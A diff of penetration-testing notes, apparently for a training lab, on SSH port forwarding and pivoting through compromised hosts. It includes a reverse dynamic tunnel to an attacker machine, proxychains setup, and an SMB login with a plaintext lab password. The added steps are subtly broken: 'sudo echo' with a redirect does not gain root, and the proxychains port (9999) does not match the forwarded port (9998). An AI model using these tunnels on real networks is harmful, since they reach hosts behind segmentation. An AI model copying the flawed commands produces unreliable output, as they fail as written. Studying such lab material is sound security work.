@@ -51,7 +51,7 @@ Attacker machine can now access smb machine through confluence machine on port 4
 ```bash
 smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
 ```
-## Dynamic Port Forwarding
+## Dynamic Local Port Forwarding
 Forwards traffic received on one port to access everything visible on another machine.
 
 Run on the jumpbox:
@@ -61,7 +61,7 @@ ssh -N -D 0.0.0.0:9999 $(SSH_USER)@$(IP_OF_TARGET)
 ### Proxychains
 To be able to use any tool through this open port forward, proxychains will need to be configured.
 ```bash
-echo "socks5 $(JUMPBOX_IP) 9999" >> /etc/proxychains4.conf
+sudo echo "socks5 $(JUMPBOX_IP) 9999" >> /etc/proxychains4.conf
 ```
 Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
 ### Example
@@ -77,7 +77,7 @@ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
 ```
 Edit the proxychains config on attacker machine:
 ```bash
-echo "socks5 192.168.50.63 9999" >> /etc/proxychains4.conf
+sudo echo "socks5 192.168.50.63 9999" >> /etc/proxychains4.conf
 ```
 Run commands to access different ports on the smb machine from attacker machine:
 ```bash
@@ -100,7 +100,7 @@ There are 4 machines.
 * Database machine can reach "SMB" machine and confluence machine. IP=10.4.50.215
 * SMB machine can reach database machine. IP=172.16.50.217
 
-Run this on confluence to make port 5432 reachable via localhost 2345:
+Run this on confluence to make port 5432 reachable via localhost port 2345:
 ```bash
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 ```
@@ -108,3 +108,18 @@ On the attacker machine:
 ```bash
 psql -h 127.0.0.1 -p 2345 -U postgres
 ```
+## Dynamic Remote Port Forwarding
+Note: Only works on OpenSSH Client v7.6+. So the remote machines SSH version matters.
+
+Remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.
+
+Run on jumpbox:
+```bash
+ssh -N -R 9998 kali@$(ATTACKER_IP)
+```
+### Proxychains
+To be able to use any tool through this open port forward, proxychains will need to be configured.
+```bash
+sudo echo "socks5 127.0.0.1 9999" >> /etc/proxychains4.conf
+```
+Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
